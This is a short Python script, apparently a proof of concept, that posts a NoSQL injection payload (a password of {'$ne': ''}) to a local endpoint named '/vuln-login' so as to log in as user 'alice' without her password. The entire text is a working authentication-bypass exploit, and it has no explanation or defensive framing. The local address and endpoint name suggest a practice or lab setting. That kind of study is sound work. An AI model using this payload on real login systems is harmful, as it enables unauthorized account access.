import requests

url = "http://127.0.0.1:5050/vuln-login"
payload = {"username": "alice", "password": {"$ne": ""}}

resp = requests.post(url, json=payload, timeout=10)
print("Response:", resp.text)